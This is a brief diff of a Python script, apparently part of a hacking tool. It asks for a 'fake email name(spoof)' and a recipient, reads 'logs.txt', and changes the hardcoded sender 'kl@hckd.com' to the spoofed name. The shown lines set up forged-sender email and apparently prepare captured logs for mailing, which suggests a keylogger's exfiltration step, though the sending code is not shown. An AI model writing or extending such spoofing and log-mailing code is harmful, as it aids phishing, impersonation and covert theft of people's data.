@@ -1,7 +1,7 @@
 import smtplib
 import time
 sendername = str(input("fake email name(spoof)"))
-sender = "kl@hckd.com"
+sender = '"' + sendername + '"'
 receiver = str(input("type your email:"))
 receivers = "['" + receiver + "']"
 f = open("logs.txt", "r")
